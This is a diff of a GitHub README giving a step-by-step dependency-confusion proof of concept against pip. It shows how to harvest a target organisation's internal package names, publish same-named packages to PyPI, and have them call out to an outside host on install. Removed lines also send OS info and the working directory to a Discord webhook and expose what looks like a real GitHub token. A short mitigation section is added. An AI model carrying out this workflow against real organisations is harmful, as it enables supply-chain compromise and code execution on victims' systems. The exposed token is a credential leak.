@@ -4,144 +4,94 @@
 <p align="center"><img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/techghoshal?style=social"></p>
 </h1>
 
+# Introduction
 
-## How to Finds & How to Exploit
+Dependency confusion is a supply chain vulnerability that arises when package managers inadvertently install malicious packages from public repositories instead of intended private ones. This issue is particularly prevalent in Python's package management system, where tools like `pip` may prioritize public packages over private ones if not properly configured. Exploiting this behavior can lead to severe consequences, including remote code execution (RCE) on target systems.
 
-Finds requirement.txt then check the all dependency here is public or not
+# Attack Overview
 
-`https://pypi.org/project/pip/`
+The typical workflow of a dependency confusion attack involves the following steps:
 
-#### Download all target github repository
-- Crate personal access tokens (classic):- https://github.com/settings/tokens
-- Install ghorg - https://github.com/gabrie30/ghorg#installation
+1. **Identifying Target Dependencies**: Attackers search for `requirements.txt` files in public repositories to identify internal package names used by organizations.
+
+2. Verifying Package Availability: For each identified package, attackers check if it exists on the public Python Package Index [(PyPI)](https://pypi.org/). This can be automated using tools like `httpx` to detect 404 responses, indicating the package is absent from PyPI.
+
+3. **Publishing Malicious Packages**: Attackers create and publish malicious packages on PyPI using the same names as the internal packages. These malicious packages can be designed to execute arbitrary code upon installation.
+
+4. **Triggering Installation**: When the target organization installs dependencies without strict index configurations, `pip` may fetch the malicious package from PyPI, leading to code execution within the organization's environment.
+
+# Proof of Concept (PoC)
+
+The repository provides a PoC demonstrating this attack vector:
+
+- **Cloning Target Repositories**: Utilize tools like [ghorg](https://github.com/gabrie30/ghorg) to clone all repositories from a target organization.
+
 ```bash
-$ ghorg clone <target> -t <token>
+ghorg clone <target_organization> -t <personal_access_token>
 ```
-`example: $ ghorg clone google -t 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`
-    
-- After Download all repository finds vulnerable python package
-    
-```bash 
-$ find . -type f -name requirements.txt | xargs -n1 -I{} cat {} |  awk '{print $1;}' | tr -d '><~#$' | sort -u |  cut -d '=' -f 1 | awk '{print $1;}' | sed -r 's/[^[:space:]]*[0-9][^[:space:]]* ?//g' | sort -u | xargs -n1 -I{} echo "https://pypi.org/project/{}/" | httpx -status-code -silent -content-length -mc 404
+- **Extracting Dependencies**: Search for `requirements.txt` files and extract package names.
+
+```bash
+find . -type f -name requirements.txt | \
+xargs -n1 -I{} cat {} | \
+sed 's/[><=~!].*//' | \
+tr -d '[:space:]' | \
+sort -u | \
+xargs -I{} sh -c 'curl -s -o /dev/null -w "%{http_code} https://pypi.org/project/{}/\n" https://pypi.org/project/{}/' | \
+grep "^404"
 ```
-- 404 code means this package not available publicly So This the vulnerable to dependencies confusion.
-
-- So now Publish this python packages publicly (https://pypi.org)
-
+- **Creating Malicious Packages**: For each vulnerable package:
 ```bash
 $ mkdir <package-name>
-```
-```bash
 $ cd <package-name>
-```
-```bash
-$ mkdir <package-name> 
-```
-```bash
+$ mkdir <package-name>
 $ cd <package-name>
+$ touch __init__.py
 ```
+- **Insert malicious code into** `__init__.py`:
 ```bash
-$ touch __init__.py 
+import requests
+# Example: Send a request to a monitoring URL
+requests.get("https://example.com/notify")
 ```
-
+- Save this file and back `cd..` from the directory
+- **Create** `setup.py` with appropriate metadata:
+**Note**: The version of package and the version of the vulnerable package must be same
 ```bash
-# python package dependency confiuse vulnerability POC 
-# name: techghoshal
-# e-mail: techghoshal@gmail.com
-# Impact this vulnerability: Remote code execution(RCE)
-
-
-import request
-#from discord import SyncWebhook
-#import os
-
-## canarytokens_url OR burp collaborator URL
-requests.get("canarytokens_url")
-
-## Send target system info to your discord server 
-#webhook = SyncWebhook.from_url("<discord_webhook_url>")
-
-#osname =  os.uname()
-#cwd = os.getcwd()
-
-#webhook.send(f"OS-Info: {osname}")
-#webhook.send(f"Current-DIR: {cwd}")
-```
-
-- Save this file
-
-```bash
-$ cd .. 
-```
-```bash
-$ touch setup.py
-```
-- Note: The version of package and the version of the vulnerable package must be same
-    
-```bash 
 from setuptools import setup, find_packages
-import codecs
-import os
 
-here = os.path.abspath(os.path.dirname(__file__))
-
-with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
-    long_description = "\n" + fh.read()
-
-VERSION = '0.0.1'
-DESCRIPTION = 'Dependency confiuse Attack'
-LONG_DESCRIPTION = 'Python package dependency confiuse vulnerability POC. Impact this vulnerability is Remote code execution (RCE)'
-
-# Setting up
 setup(
     name="<package-name>",
-    version=VERSION,
-    author="<techghoshal>",
-    author_email="<techghoshal@gmail.com>",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=long_description,
+    version="0.0.1",
+    author="Attacker Name",
+    author_email="attacker@example.com",
+    description="Malicious package for dependency confusion attack",
     packages=find_packages(),
-    install_requires=['requests', 'discord'],
-    keywords=[]
-   )
+    install_requires=['requests'],
+)
 ```
-- Save this file
-
-```bash
-$ touch README.md
-```
-```bash
-<h1 align="center">This Python package vulnerable to dependency confusion vulnerability</h1>
-```
-- Save this file
-
-- Next build package
+- Build and upload the package to PyPI:
 ```bash
 $ python3 setup.py sdist bdist_wheel
-```
-
-- Upload file publicly (https://pypi.org)
-
-- Create Accont on pypi.org
-
-```bash
 $ pip3 install twine
-```
-```bash
 $ twine upload dist/*
 ```
+# Mitigation Strategies
 
-- Enter your username: <username>
-- Enter your password: <password>
+To protect against dependency confusion attacks:
 
----
-    
-Upload IS DONE 😎 
-<br>
-🎉 Now Bounty Time 💰💰
-    
-## Connect me
-If you have any queries, you can always contact me on <a href="https://twitter.com/techghoshal">twitter(@techghoshal)</a>
+- **Configure Package Indexes**: Use `--index-url` and `--extra-index-url` options in `pip` to prioritize private repositories over public ones.
 
+- **Implement Package Scopes**: Employ tools like `pip`'s upcoming features (as per [PEP 708](https://peps.python.org/pep-0708/)) to define trusted sources for specific packages.
 
+- **Monitor and Audit Dependencies**: Regularly scan dependencies for anomalies and ensure that all internal packages are also present in private repositories to prevent unauthorized public versions.
+
+- **Use Dependency Management Tools**: Utilize tools like [Thoth](https://developers.redhat.com/articles/2021/12/21/prevent-python-dependency-confusion-attacks-thoth) to manage and resolve dependencies securely.
+
+# Conclusion
+
+Dependency confusion poses a significant risk to software supply chains. By understanding the attack vectors and implementing robust dependency management practices, organizations can mitigate the threat and secure their development environments.
+
+### Connect me
+
+If you have any queries, you can always contact me on [Linkedin](https://www.linkedin.com/in/anindyaghoshal/)
